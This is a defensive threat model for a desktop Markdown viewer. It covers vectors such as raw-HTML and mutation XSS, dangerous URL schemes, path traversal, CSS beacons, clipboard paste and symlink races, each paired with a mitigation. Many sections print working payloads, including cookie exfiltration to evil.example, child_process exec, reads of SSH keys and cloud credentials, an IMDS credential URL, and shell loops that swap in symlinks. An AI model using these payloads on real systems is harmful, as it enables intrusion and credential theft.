# 01 — Threat model

> What are we protecting, from whom, and what happens when we lose.

Written for **Siyana Markdown Viewer**: a desktop application (Windows and Linux
first) whose entire purpose is to open `.md` files that arrive from places the
application has no control over — a download, an email attachment, a `git clone`,
a USB stick, a colleague's shared drive, an AI tool's output directory.

---

## 1. Scope and assumptions

### 1.1 In scope

- The desktop app: renderer, native layer, IPC surface, filesystem access,
  network access, updater.
- The rendering pipeline, end to end, including print and export.
- The build and release pipeline (see
  [04-dependency-and-supply-chain.md](./04-dependency-and-supply-chain.md)).
- The web build when it ships, insofar as it reuses `packages/core`.

### 1.2 Out of scope (stated so it is a decision, not an oversight)

- **The operating system.** If the user's OS is compromised, we are.
- **The user's own shell.** We do not defend a user who runs a shell as
  administrator; we defend against *our own code* being turned into that.
- **Physical attacks** while the app is running with an unlocked session.
- **Social engineering the user** into disabling a warning we show.
- **Side channels** (timing, cache) beyond what a browser sandbox already
  provides.

### 1.3 Assumptions (each one, if false, invalidates part of the model)

1. The webview engine (Chromium/Chromium-based WebView2 on Windows, WebKitGTK on
   Linux, WKWebView on macOS) is not already compromised.
2. Our Rust/Node/TypeScript code has no memory-safety bugs reachable from
   document content. **This is the weakest assumption in the whole model.** A
   Rust memory-safety bug is RCE directly and no sanitizer in the world helps.
   Mitigations: keep native code small, use safe APIs, fuzz the parsers, keep
   `unsafe` blocks to a counted, audited minimum.
3. The dependency tree is not compromised. Treated as an active threat in
   [04-dependency-and-supply-chain.md](./04-dependency-and-supply-chain.md).
4. The user has not granted the app administrator rights.
5. Filesystem permissions behave as documented on the user's platform.

### 1.4 Security objectives, in priority order

| # | Objective | Test |
|---|-----------|------|
| **O1** | Opening a document never executes attacker-controlled code with the user's privileges | the payload corpus in [05-rendering/02-sanitization.md §10](../05-rendering/02-sanitization.md#10-sanitizer-test-corpus-must-exist-before-v01-ships) executes nothing, in CI and in release smoke tests |
| **O2** | A renderer compromise does not become code execution | `contextIsolation: true`, `sandbox: true`, `nodeIntegration: false`, minimal preload, minimal Tauri capabilities; verified by attempting to reach `require` from an injected payload |
| **O3** | A document cannot cause reads or writes outside what the user opened | the filesystem adapter's containment tests; traversal corpus in [§5.4](#54-vector-path-traversal-and-local-file-exfiltration) |
| **O4** | A document cannot cause an outbound network request without explicit user consent | remote-image blocking + `connect-src` + test with network interception |
| **O5** | A document cannot cause data loss | no write path exists that a document can influence; export writes atomically |
| **O6** | Availability: a document cannot hang or exhaust the app | parse time-bounded, memory-capped, image dimension-capped, rendering in a worker |
| **O7** | Updates cannot be forged | signed installers + verified signatures ([04](./04-dependency-and-supply-chain.md#5-signed-updates-and-verification)) |

## 2. Assets at risk

| Asset | Why it matters | Impact if lost |
|-------|----------------|----------------|
| **The user's filesystem** (read) | SSH keys, `.env`, browser profiles, password-manager vaults, source repos, personal documents | account takeover, financial fraud, corporate espionage |
| **The user's filesystem** (write) | the same, plus ransomware and document destruction | irreversible loss |
| **Code execution as the user** | the payload is "run this program with my privileges" | everything above, immediately |
| **Clipboard** | passwords from a manager, crypto addresses, PII | account takeover, financial theft |
| **Credentials and tokens** | `~/.aws`, `~/.ssh`, `~/.config/gh/hosts.yml`, `~/.docker/config.json`, `~/.npmrc`, browser cookies, `~/.config/gcloud`, `~/.netrc`, password-manager databases | cloud account compromise, source-control takeover |
| **Network position** | the renderer can issue requests; local network and cloud metadata endpoints are reachable | internal port scanning, credential theft from internal services, IMDS credential theft |
| **Screen and UI** | the renderer paints what the user reads and clicks | phishing with perfect fidelity, clickjacking, fake permission prompts |
| **Keystrokes and input** | the renderer receives keyboard events | keylogging within the app window |
| **Availability** | the app is the user's tool | lost work, lost trust |
| **Supply chain integrity** | the app auto-updates | persistent compromise of every user |
| **The user's privacy** | the documents themselves, plus reading habits, plus which documents are opened | surveillance, doxxing |

The first row dominates. In every real desktop-app compromise in this space, the
goal was filesystem read followed by exfiltration or execution.

## 3. Adversaries

| # | Adversary | Capability | Motivation |
|---|-----------|-----------|-----------|
| **A1** | Remote attacker, no user interaction beyond "open this file" | crafts a `.md`; distributes it via a repo, a gist, a download, a phishing attachment | credential theft, ransomware, cryptomining, botnet recruitment |
| **A2** | Malicious repository author | controls files a developer will `git clone` and open "to read the docs" | same as A1, but higher hit rate — developers open READMEs from strangers routinely |
| **A3** | Hostile collaborator (same repo, same org) | commits a `.md` change that reviewers skim | supply-chain poisoning of internal docs |
| **A4** | Compromised dependency / npm or crates account | executes in our process at build time or run time | backdoor in every install |
| **A5** | Compromised CI / release pipeline | signs a malicious build | same as A4, more direct |
| **A6** | Malicious web page the user is looking at | controls clipboard contents and can attempt drag-and-drop | DOM XSS via the paste path — this is the MarkText CVE-2023-2318 model exactly |
| **A7** | Local unprivileged process on the same machine | can write to the user's temp dir, `$PATH`, `~/.config` | waits for us to execute something it placed |
| **A8** | Network attacker (not the document author) | sees our traffic | must be mitigated by O4; note that we should send no traffic at all by default |
| **A9** | Curious neighbour / shared machine user | opens files the user left | local privacy |
| **A10** | The user, accidentally | pastes from a bad source, opens the wrong file | the CVE-2019-20374 class: ordinary use, extraordinary consequence |

**A2 deserves emphasis.** The highest-yield attack against a Markdown viewer is
not a `.md` file emailed from a stranger; it is a `README.md` in a repository the
user chose to install, containing a `docs/` folder with three files. The user's
mental model is "reading documentation is safe". Every product in this category
has been compromised that way.

## 4. Attack surface

```mermaid
flowchart TB
    subgraph ENTRY["Entry points"]
        E1["open file / drag-drop / CLI arg"]
        E2["recent files / bookmarks"]
        E3["clipboard paste"]
        E4["file watcher (on-disk change)"]
        E5["deep link / custom protocol"]
        E6["update server"]
    end

    subgraph TRANSFORM["Pure computation (no side effects)"]
        T1["decode"]
        T2["parse"]
        T3["transform + slug"]
        T4["serialize"]
        T5["sanitize"]
        T6["highlight"]
    end

    subgraph EFFECTS["Side-effecting surfaces — the attack surface proper"]
        F1["fs: read / write / delete / watch"]
        F2["shell: openExternal / spawn"]
        F3["net: image fetch / update check / telemetry"]
        F4["clipboard read/write"]
        F5["window / dialog / IPC"]
        F6["export: write file"]
    end

    E1 --> T1
    E2 --> T1
    E3 --> T1
    E4 --> T1
    E5 --> T1
    T1 --> T2 --> T3 --> T4 --> T5 --> T6
    T6 --> D["DOM"]

    D -->|"user click"| F2
    D -->|"ipc invoke"| F1
    D -->|"ipc invoke"| F5
    T6 -. "media resolver" .-> F1
    T6 -. "remote images"| F3
    D -. "paste / drop"| T1
    F6 -->|"user command"| FS2["filesystem"]

    style EFFECTS fill:#7f1d1d22,stroke:#b91c1c
    style TRANSFORM fill:#1f6feb22,stroke:#1f6feb
```text

**Key observation from the diagram:** stages `decode` through `highlight` have no
outgoing arrows to the side-effecting surfaces except through an explicit,
reviewed path. Every edge from the untrusted-data region into the
side-effecting region is a thing we can name and audit:

| Edge | Controlled by | Auditable? |
|------|---------------|-----------|
| DOM → `openExternal` | click handler + 4-scheme allowlist | yes, one function |
| DOM → `ipc invoke` | Tauri capabilities; Electron preload bridge | yes, a short list |
| media resolver → fs | `realpath` + containment + extension allowlist | yes, one function |
| media resolver → net | remote-image policy (off by default) | yes, one setting |
| paste → transform | sanitizer runs before anything else | yes |

If a new edge appears from the untrusted region into the side-effecting region,
it is a security change and needs review. That is the rule.

## 5. Attack vectors

### 5.1 Vector: XSS via raw HTML (CommonMark type 6/7 blocks)

**Attack.** Embed a `<script>` or an event handler directly in Markdown.

**Payloads.**

````markdown
<script>fetch('https://evil.example/?d='+encodeURIComponent(document.cookie))</script>
````text

````markdown
<img src=x onerror="require('child_process').exec('calc')">
````text

```markdown
<a href="#" onclick="fetch('https://evil.example/x')">click</a>
```

````markdown
<details open><summary>Read more</summary><script>alert(1)</script></details>
````

**Impact.** In Electron with `nodeIntegration: true` or a leaky preload: RCE. In a
correctly configured app: at minimum, full UI compromise, reading and rewriting
everything on screen, and phoning home through any permitted channel.

**Mitigation.** Sanitizer with a tag/attribute allowlist as a rendering stage
([05-rendering/02-sanitization.md](../05-rendering/02-sanitization.md));
`script`/`on*`/`style` denied by omission; the entire payload corpus as a CI
test; plus shell configuration so a bypass is not RCE.

**Residual risk.** A future DOMPurify bypass. This is *not* hypothetical —
[CVE-2024-45801](https://nvd.nist.gov/vuln/detail/CVE-2024-45801),
[CVE-2026-0540](https://nvd.nist.gov/vuln/detail/CVE-2026-0540),
[CVE-2026-47423](https://nvd.nist.gov/vuln/detail/CVE-2026-47423) all existed
within the last three years. Mitigated by CSP, Trusted Types, sandboxing, and
version pinning with Dependabot.

### 5.2 Vector: mutation XSS and namespace confusion

**Attack.** Craft markup that is inert in the tree the sanitizer inspects but
becomes active when the string is serialized and reparsed.

**Payloads.**

```html
<svg></p><style><a id="</style><img src=x onerror=alert(1)>"></svg>
```text

```html
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
```text

```html
<svg><foreignObject><xmp><img src=x onerror=alert(1)></xmp></foreignObject></svg>
```text

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

**Impact.** Sanitizer bypass → XSS → O1 failure.

**Mitigation.** `USE_PROFILES: { html: true }` (no SVG, no MathML);
`SAFE_FOR_XML: true` (reject rawtext closers inside attribute values);
namespace-parent checking; **and never post-process sanitized output**. Our
pipeline sanitizes then inserts once, so the serialize/reparse round trip that
mXSS depends on only happens once, at `innerHTML`.

**Residual risk.** This is the highest-frequency class of sanitizer bug. We
mitigate by using DOMPurify with `RETURN_DOM_FRAGMENT` on the screen path, which
*eliminates* the serialize/reparse step rather than trying to make it safe. See
[CVE-2026-65914](https://nvd.nist.gov/vuln/detail/CVE-2026-65914) for what
happens when an application re-contextualizes the output.

### 5.3 Vector: dangerous URL schemes

**Attack.** A link whose href executes code, or which leaks data.

**Payloads.**

```markdown
[click](javascript:fetch('https://evil.example/?'+document.cookie))
```text

```markdown
[click](vbscript:msgbox(1))
```text

```markdown
[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
```text

```markdown
[click](jav&#x09;ascript:alert(1))
```

```markdown
[click](java%0ascript:alert(1))
```text

```markdown
[![](x)](  javascript:alert(1)  )
```text

**Impact.** Script execution on click; data exfiltration; navigation of the
app window to a phishing page.

**Mitigation.** Scheme allowlist (`http`, `https`, `mailto`, `tel`, relative,
and `data:image/{png,jpeg,gif,webp,bmp}` for `img[src]` only, under a size cap).
Parse with `new URL()` rather than a hand-written regex; strip ASCII whitespace
and control characters first, because browsers ignore them when resolving.
`data:image/svg+xml` banned. Every `href` that fails becomes inert with its text
preserved.

**Residual risk.** Filter differentials between our `new URL()` classification and
the browser's actual resolution. Mitigated by using `new URL()` — *the same*
function — and by not allowing the sanitizer's `ALLOWED_URI_REGEXP` to be
customized.

### 5.4 Vector: path traversal and local file exfiltration

**Attack.** Read a file outside the document's directory by referencing it as an
image source, then observe it.

**Payloads.**

````markdown
![](../../../../.ssh/id_rsa)
````text

````markdown
![](file:///C:/Users/victim/.aws/credentials)
````

````markdown
![](../../../Windows/win.ini)
````text

````markdown
![](\\\\evil-server\\share\\secret.png)
````text

```markdown
![](/etc/shadow)
```text

```markdown
![](..%5c..%5c..%5cUsers%5cvictim%5c.id_rsa)
```

```markdown
![](../../secret.png::$DATA)
```text

The last one is not hypothetical: [CVE-2026-53571](https://www.sentinelone.com/vulnerability-database/cve-2026-53571)
is a Windows path-deny-list bypass in Vite's dev server using exactly
`::$DATA` alternate-data-stream suffixes and 8.3 short names. CWE has dedicated
entries for this class: [CWE-69](https://cwe.mitre.org/data/definitions/69.html)
(`::DATA` ADS), [CWE-58](https://cwe.mitre.org/data/definitions/58.html) (8.3
filenames), [CWE-40](https://cwe.mitre.org/data/definitions/40.html) (UNC shares),
[CWE-39](https://cwe.mitre.org/data/definitions/39.html) (`C:dirname`).

**Impact.** Confidentiality. Even if we cannot display the file as an image, a
successful read is a successful read — and if the format happens to be something
an image decoder will render, the bytes are in the renderer's memory.

**Mitigation.** `realpath` **before** the containment check; containment relative
to the document's real directory *and* to the set of roots the user has opened;
a separate extension allowlist (`png jpg jpeg gif webp bmp svg ico avif`); refusal
of `file:` URLs, absolute paths, and UNC paths; a size cap; and a dimension cap.
Full treatment in [03-filesystem-safety.md §2](./03-filesystem-safety.md#2-path-traversal-the-windows-special-cases).

**Residual risk.** TOCTOU: a symlink swapped between the `realpath` check and the
`open`. Mitigated by opening the resolved path with `O_NOFOLLOW`-style semantics
where available, or by re-`realpath`ing after open and comparing inodes.

### 5.5 Vector: DOM clobbering

**Attack.** Shadow DOM properties so application code reads attacker values.

**Payload.**

```html
<img src=x name=getElementById>
<form><input name=attributes><input name=action></form>
<a id="body" href="https://evil.example/">…</a>
```

**Impact.** Logic bugs that escalate to XSS. DOMPurify's threat model cites
`document.getElementById` being shadowed as the canonical example, and PortSwigger's
["DOM Clobbering strikes back"](https://portswigger.net/research/dom-clobbering-strikes-back)
shows the modern refinements.

**Mitigation.** All DOM access via `querySelector` on a container we own, with
`CSS.escape()` on interpolated values. `SANITIZE_DOM: true`. Our generated ids are
prefixed (`h-`, `fn-`, `fnref-`). `name` denied on all elements. Never read a
property off `document`, `window`, or a form element obtained from the document.

**Residual risk.** We write lots of app JavaScript and it is easy to write
`document.getElementById('content')` out of habit. A lint rule bans it in
`content/` code paths.

### 5.6 Vector: CSS-based attacks and exfiltration

**Attack.** Use CSS to load remote resources, or to overlay the UI.

**Payload.**

```html
<style>@import url('https://evil.example/leak.css');</style>
```text

```html
<div style="background-image:url(https://evil.example/p.gif?d=1)">text</div>
```

```html
<a href="#" style="position:fixed;inset:0;opacity:0;z-index:99999">
```text

**Impact.** Beacon / IP disclosure; UI overlay for clickjacking; attribute-selector
exfiltration (`input[value^="a"]{background:url(//evil/a)}`) if forms were present.

**Mitigation.** `FORBID_TAGS: ['style']` and `FORBID_ATTR: ['style']`. DOMPurify
states plainly that it "is not a CSS sanitizer" and that CSS-based data
exfiltration is an explicit non-goal, so this has to be an allowlist decision,
not a sanitizer feature. Table alignment therefore uses classes
([05-rendering/01-ast-to-html.md §1.6](../05-rendering/01-ast-to-html.md#16-tables)). CSP
`style-src 'self' 'unsafe-inline'` (we need inline for runtime theme variables) —
never `https:`, so no remote stylesheet.

**Residual risk.** Our own `content.css` is trusted by definition. A document
cannot add a class to the document root. Fine.

### 5.7 Vector: remote image loading as a beacon and SSRF probe

**Attack.** A document with 200 remote `<img>` tags.

**Payload.**

```markdown
![](https://evil.example/collect?doc=secret-notes)
![](http://192.168.1.1/)
![](http://169.254.169.254/latest/meta-data/iam/security-credentials/)
```

**Impact.** IP disclosure, proof that a specific document was opened and when,
network topology probing, and on a cloud VM a route to IMDS credential theft.
DOMPurify's non-goals are explicit that it "will **NOT** reliably stop HTML that
requests external resources (tracking pixels, prefetch, etc.)".

**Mitigation.** Remote images blocked by default, per-document opt-in, with a
visible placeholder showing the host and a count in the status bar.
`img-src` in CSP omits `https:` entirely in the default state.

**Residual risk.** *Accepted and documented.* A user who clicks "load remote
images" has consented. We must ensure the consent is explicit, per-document, and
not sticky across documents.

### 5.8 Vector: ReDoS / algorithmic-complexity DoS

**Attack.** A document whose every character triggers catastrophic backtracking.

**Payloads.** The published PoC shape from
[CVE-2022-21681](https://nvd.nist.gov/vuln/detail/CVE-2022-21681) (`marked`):

```markdown
[x]: x
\[\](\[\](\[\](\[\](\[\](\[\](\[\](\[\](\[\](\[\](\[\](\[\](\[\](%5C%5B%5C%5D(%60))
```text

For quadratic (O(n²)) rather than exponential behaviour, from
[CVE-2026-48988](https://nvd.nist.gov/vuln/detail/CVE-2026-48988)
(`markdown-it`, `typographer: true`):

```markdown
"''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''"
```

And a nesting-depth payload targeting parser *and* sanitizer limits:

```html
<svg><svg><svg>…<!-- ×8192 --><style><img src=x onerror=alert(1)></style>
```text

**Impact.** UI freeze; on the desktop, an unresponsive window the user kills.
The mXSS dimension of the nesting payload matters too: past the parser's depth
limit (512 in Blink and WebKit per WebKit bug 63082, adopted by Gecko for
compatibility) descendants become *siblings*, so "source nesting ≠ final DOM
ancestry".

**Mitigation.** Parse in a **Web Worker with a hard timeout**, so the UI thread
cannot be blocked indefinitely; kill and restart the worker on timeout. Cap
document size. Cap AST depth and node count. Never enable `typographer` without
understanding its cost profile. Depth-limit regression tests with both
near-threshold (512) and oversized (8192) depths.

**Residual risk.** A worker timeout interrupts but does not undo partial output;
we must not render partial output. And a payload that is merely *large* rather
than pathological is still a DoS — hence the size cap.

### 5.9 Vector: clipboard / paste path

**Attack.** The user copies from a malicious web page and pastes into a document.

**Payload.** In the source page:

```html
<div id="p" onclick="
  navigator.clipboard.writeText('[](javascript:alert(1)) <img src=x onerror=alert(1)>')
    .then(()=>document.title='pasted')
">copy me</div>
```

Or, for HTML clipboard flavour, an anchor whose `href` equals its text (the exact
MarkText CVE-2023-2318 trigger: copied links were re-fetched for a page title and
then assigned via `innerHTML`, with one branch using `textContent` **as HTML**):

```html
<a href="https://evil.example/">https://evil.example/</a>
```text

**Impact.** RCE. [CVE-2023-2318](https://nvd.nist.gov/vuln/detail/CVE-2023-2318)
was `require("child_process").exec("gnome-calculator -e 'MarkText RCE PoC'")`,
triggered by copy-then-paste.

**Mitigation.** **Do not build a paste path that converts HTML to HTML.** If we
paste-convert HTML → Markdown, the result must go through the full pipeline
(decode → parse → transform → sanitize) exactly like a file. When converting
HTML → Markdown, extract **text content and attributes as data**, never
re-emit source markup. Never assign `textContent`-derived data to `innerHTML`.
Never fetch a URL found in pasted content.

**Residual risk.** Any paste-related feature is high-risk by construction. If we
cannot justify it for v0.1, we do not ship it.

### 5.10 Vector: malicious export / print output

**Attack.** A document designed so its exported file is a weapon for the recipient.

**Payload.**

````markdown
# Invoice #A-1

Payment required to <a href="https://evil.example/pay">our new portal</a>.

![](https://evil.example/t.gif?id=<victim-id>)
````

**Impact.** The recipient opens a file that *looks* like it came from a
legitimate tool, styled identically, containing a phishing link. Any script in it
would run in the recipient's full browser with their cookies.

**Mitigation.** `script-src 'none'` and `default-src 'none'` in the export CSP;
`img-src data:` only, so remote images become text placeholders; no scripts in
exports at all; optional provenance footer; optional "anonymise" mode that
strips `href` and prints the URL as text.

**Residual risk.** Social engineering survives any technical control. We can only
make the file *inert*, and label it honestly.

### 5.11 Vector: UI spoofing via `title`/window manipulation

**Attack.** A document that changes the window title or content to look like a
different application or a permission prompt.

**Payload.**

````markdown
<script>document.title = 'Siyana — Grant Full Disk Access to continue reading'</script>
````text

**Impact.** Phishing with a legitimate application's chrome.

**Mitigation.** `document.title` is set from the file's basename, in native code,
after rendering, and the renderer cannot change it. A renderer that could change
the title is a renderer with script execution — already O1 failure — but defense
in depth here is free. Window geometry changes (`did-resize`, `moved`) are
refused unless the user initiated them.

### 5.12 Vector: compromised dependency

**Attack.** A transitive dependency with a malicious postinstall, or a maintainer
account takeover.

**Payload.** Not in a document — in the build. The action is "a maintainer pushed
a release".

**Impact.** Arbitrary code in our build, in our app, and in every user's install.
This is the threat model of essentially every software supply-chain compromise.

**Mitigation.** Lockfiles committed; exact version pinning; integrity hashes
verified at install; `npm ci` / `cargo --locked` only, never a bare install;
Dependabot for the parser and sanitizer specifically; SBOM per release; signed
releases with signature verification in the updater; reproducible-build
attempted; build-time dependencies reviewed the same as runtime.

**Residual risk.** A dependency could be compromised between our review and our
build. Only SBOM + fast patch cadence + signed, transparency-logged releases limit
this. See [04-dependency-and-supply-chain.md](./04-dependency-and-supply-chain.md).

### 5.13 Vector: local privilege and symlink attacks

**Attack.** A local process (A7) plants a file or a symlink that we then read,
write, or execute.

**Payloads.**

```bash
# A7 plants this where our watcher will see it
ln -s /home/victim/.ssh/id_rsa ~/notes/innocent.md
ln -s /etc/shadow ~/notes/totally-fine.md
```text

```bash
# Symlink loop to hang a recursive directory walk
mkdir -p ~/notes/a && ln -s ~/notes ~/notes/a/loop
```

```bash
# TOCTOU: swap the file between our check and our read
while :; do echo 'pwned' > /tmp/x.md; rm /tmp/x.md; ln -s ~/.ssh/id_rsa /tmp/x.md; done
```text

**Impact.** Confidentiality via symlinked documents; availability via symlink
loops in a directory walk; integrity via TOCTOU.

**Mitigation.** Resolve with `realpath` before use; compare device+inode after
open; cap directory-walk depth, entry count, and total bytes; detect inode
repeats in a walk to catch loops; open temp files with `O_EXCL` and restrictive
permissions; use `O_NOFOLLOW` where the platform provides it. Detail in
[03-filesystem-safety.md §3](./03-filesystem-safety.md#3-symlinks-junctions-and-directory-walk-loops)
and
[§5](./03-filesystem-safety.md#5-toctou-and-concurrent-modification).

**Residual risk.** On Windows, symlinks require developer mode or elevation, so
this is mostly a Linux concern. Junction points and hard links remain possible.

### 5.14 Vector: TOCTOU and concurrent modification

**Attack.** Read a file while an editor is rewriting it.

**Payload.**

```
mv notes.md notes.md.tmp && printf '# Half-written' > notes.md && mv notes.md.tmp notes.md &
```text

Editor behaviours that produce garbage rather than an attack: write-in-place
(truncate then write — we see a partial file), atomic-rename (we either see the
old or new file, never a mix — the *good* case), lock files (`.~lock.notes.md#`,
`.swp`), and save-to-temp-then-rename.

**Impact.** Mostly correctness (garbled render), but also: reading a
half-written file and then *saving over it* would destroy user data. And a
file that is a symlink at check time and a regular file at open time defeats the
check.

**Mitigation.** Read once into memory, `stat` before and after, and if `mtime` or
`size` changed, discard and retry (bounded). Debounce watcher events by 150–300 ms
and coalesce. Detect the atomic-rename case and treat it as a normal change.
Never write to a document the user did not explicitly ask us to modify. Compare
inode/device after open where the platform allows it.

**Residual risk.** None material. This is a correctness problem, handled.

### 5.15 Vector: zip-slip and archive extraction

**Attack.** The user opens a `.zip` of Markdown we offer to extract-and-open.

**Payload.** A zip entry named `../../../../home/victim/.bashrc` or
`C:\Users\victim\...\..\..\Startup\evil.vbs`.

**Impact.** Arbitrary file write → code execution on next login.

**Mitigation.** If we ship archive support at all: reject any entry whose
resolved path escapes the destination directory; reject absolute paths, `..`
segments, UNC paths, and device paths; reject symlink entries (zip can encode
them); enforce a total-extracted-size and entry-count limit to stop zip bombs;
create files with restrictive permissions and never follow existing symlinks.
**Recommendation: do not ship archive extraction in v0.1.** If a user asks us to
open a `.md` inside a `.zip`, tell them to extract it themselves. [CWE-59](https://cwe.mitre.org/data/definitions/59.html)
names zip-slip explicitly.

### 5.16 Vector: crafted filenames

**Attack.** The filename itself is the payload.

**Payloads.**

```
../../../../etc/passwd.md
```text

```
CON.md
NUL.md
COM1.md
aux.md          (Windows reserved device names)
```text

```
notes.md::$DATA
```text

```
notes
.‮gnp.exe.md    (U+202E RIGHT-TO-LEFT OVERRIDE — displays as "notes.exe.md")
```text

```
README.md      (U+200B zero-width spaces — invisible, looks like "README.md")
```text

**Impact.** Path traversal via the file-open path; UI spoofing and
extension-confusion via bidi/zero-width characters; device-path access on Windows.

**Mitigation.** The same path validation as §5.4 for the path the *user* chose,
and note that the user's own selection is a different threat than document
content — we still canonicalize, because a "recent files" entry from a corrupted
config could be hostile. Strip or escape bidi control characters and zero-width
characters in displayed filenames. Warn when a `.md` file's basename contains a
character outside `[A-Za-z0-9 ._()-]` **and** an extension other than `.md`
(`.md.exe`). Honor the Windows reserved-name list explicitly.

**Residual risk.** Filenames are user-visible everywhere; a fully correct
renderer is out of reach. Escape for display, warn for dangerous shapes.

## 6. Risk matrix

Likelihood is for a *document opened by a user*, over the life of the product,
from the adversary's perspective. Impact is the worst credible outcome.

| # | Vector | Likelihood | Impact | Risk | Primary mitigation | Residual |
|---|--------|-----------|--------|------|-------------------|----------|
| 5.1 | Raw-HTML XSS | **High** | **Critical** | **Critical** | sanitizer allowlist stage; payload corpus in CI | sanitizer bypass → contained by sandbox + CSP |
| 5.2 | mutation XSS / namespace | Medium | Critical | **Critical** | `USE_PROFILES: {html:true}`, `RETURN_DOM_FRAGMENT`, no post-processing | new engine parser differentials |
| 5.3 | Dangerous URL schemes | **High** | High | **High** | scheme allowlist via `new URL()`; `data:` narrow exception | differential with browser resolution |
| 5.4 | Path traversal / file read | **High** | High | **High** | `realpath` + containment + extension allowlist | TOCTOU symlink swap |
| 5.5 | DOM clobbering | Medium | Medium | **Medium** | `SANITIZE_DOM`, prefixed ids, `querySelector` only, lint rule | a future dev writes `getElementById` |
| 5.6 | CSS exfiltration / overlay | Medium | Medium | **Medium** | `style` element and attribute denied | *accepted*: needs user opt-in elsewhere |
| 5.7 | Remote-image beacon / SSRF probe | **High** | Medium | **High** | blocked by default; per-document opt-in; `img-src` narrow | *accepted*: user can enable |
| 5.8 | ReDoS / complexity DoS | **High** | Low (availability) | **Medium** | worker + timeout; size caps; depth caps | pathological-but-large inputs |
| 5.9 | Clipboard / paste XSS | Medium | **Critical** | **High** | no HTML→HTML paste path; full pipeline for all pastes | a future paste feature is high-risk |
| 5.10 | Malicious export | Low | High (for recipient) | **Medium** | export CSP: `script-src 'none'`, `default-src 'none'` | social engineering |
| 5.11 | UI spoofing | Low | Medium | **Low** | title set natively; refuse geometry changes | visual mimicry |
| 5.12 | Supply chain compromise | Low | **Critical** | **High** | lockfiles, integrity, SBOM, signed releases, Dependabot | maintainer compromise |
| 5.13 | Symlink / loop / TOCTOU (local) | Medium | Medium | **Medium** | realpath; depth/entry caps; inode loop detection | hard links, junctions |
| 5.14 | Concurrent modification | **High** | Low | **Low** | stat-before/after, debounce, atomic write | *accepted*: correctness only |
| 5.15 | Zip-slip | Low | **Critical** | **Medium** | **do not ship archive extraction in v0.1** | user extracts externally |
| 5.16 | Crafted filenames | Medium | Low | **Low** | display escaping; bidi/zero-width stripping | visual mimicry |

### 6.1 Reading the matrix

Four **Critical** risks and four **High**. Three observations that drive the
engineering:

1. **Everything Critical or High is in the rendering path.** Not one of them is
   about the filesystem abstraction being clever or the updater being
   interesting. XSS, mXSS, URL schemes, path traversal, and paste — all in
   [05-rendering](../05-rendering/) and the shell config. That is where the
   engineering effort belongs.
2. **The mitigations are shared.** One sanitizer, one path validator, one scheme
   classifier, one worker boundary. Four risks, four functions. The marginal
   cost of the fifth is close to zero *if* the first four are designed once.
3. **Two vectors are better solved by not building the feature.** Paste HTML
   conversion (§5.9) and archive extraction (§5.15). Shipping them is a decision,
   not an omission, and each is a permanent commitment to keep a dangerous code
   path patched forever.

## 7. Out-of-band risks we are consciously accepting

| Risk | Why accepted | Mitigation in place | Revisit when |
|------|-------------|--------------------|--------------|
| Memory-safety bugs in our native code | Unavoidable in Rust/C | Small native surface, safe APIs, `unsafe` budget, fuzzing | Every fuzzing finding |
| A sanitizer bypass in a future DOMPurify | Unavoidable in the current design | CSP, Trusted Types, sandbox, Dependabot, fast release cadence | Each DOMPurify advisory |
| Privacy leak when a user enables remote images | User consent | Blocked by default; per-document; visible | If complaints arise |
| Filename visual mimicry | Browsers have the same problem | Escaping, warnings | — |
| Supply-chain compromise | Industry-wide | Lockfiles, SBOM, signatures | Every dependency advisory |
| A zero-day in the system webview | Explicitly not defended by Tauri or Electron | Update the webview engine with the OS | Platform updates |
| Physical access to an unlocked session | Out of scope | — | — |
| Clipboard monitoring by another app | Out of our control | Read clipboard only on explicit user action | — |

Tauri states this last set plainly in its
[capabilities documentation](https://v2.tauri.app/security/capabilities/):
capabilities do not protect against "malicious or insecure Rust code", "too lax
scopes and configuration", "incorrect scope checks in the command implementation",
"anything which was written in the rust core of an application", "0-days or
unpatched 1-days in the system WebView", or "supply chain attacks or otherwise
compromised developer systems". We adopt that list as ours.

## 8. Response to a sanitizer or parser CVE

A written runbook, because the CVE response time for a desktop app is measured in
days and panic produces bad decisions.

**Parser/sanitizer XSS-class advisory:**

1. Triage within 24 h. Determine affected versions and whether our lockfile pins
   an affected version.
2. If affected: ship a patched release within 72 h, regardless of severity of the
   specific issue. Users open untrusted files daily; "low severity" on a
   sanitizer is "critical" for us.
3. Until the release is out, consider a defensive mitigation that does not require
   the dependency: for DOMPurify, tightening `FORBID_TAGS`/`FORBID_ATTR`, or
   reducing `USE_PROFILES`. For a parser, disabling a feature or capping input.
4. Add the advisory's PoC to the sanitizer test corpus permanently.

**Parser ReDoS advisory:**

1. Triage within 72 h.
2. Verify the worker timeout already bounds the impact (it should — the advisory
   mitigations for both CVE-2022-21680/21681 were exactly "run in a worker with a
   time limit").
3. Patch at leisure; document the exposure.

**Webview engine advisory (Chromium/GTK):** we cannot patch; we bump the runtime
requirement, ship a notice, and publish the affected-version list in the release
notes.

**Disclosure handling:** credit the reporter, publish a CVE if one is assigned, and
keep the fix commit public. See `SECURITY.md`.

## 9. What we are *not* defending against, in one list

Stated explicitly so that nobody mistakes an accepted risk for an oversight:

- An attacker who already runs code as the user.
- A malicious operating system or a rooted/jailbroken device.
- A malicious local webview engine (0-day in Chromium/GTK/WK).
- Malicious or insecure Rust/TypeScript code of our own.
- A dependency compromised after our last review.
- Physical access to an unlocked session.
- The user deliberately disabling our warnings.
- Denial of service from a legitimately huge document (we cap, we do not
  eliminate).
- Unicode and encoding *correctness* as a security property — that is
  [03-filesystem-safety.md §6](./03-filesystem-safety.md#6-encoding-detection-you-may-not-assume-utf-8)'s job,
  and mojibake is a correctness bug before it is a security one.

## Sources

- OWASP XSS Prevention Cheat Sheet —
  <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP DOM based XSS Prevention Cheat Sheet —
  <https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html>
- OWASP ASVS 5.0.0 — <https://asvs.dev/>
- OWASP Desktop App Security Cheat Sheet —
  <https://cheatsheetseries.owasp.org/cheatsheets/Desktop_App_Security_Cheat_Sheet.html>
- OWASP Windows Alternate Data Streams —
  <https://owasp.org/www-community/attacks/Windows_alternate_data_stream>
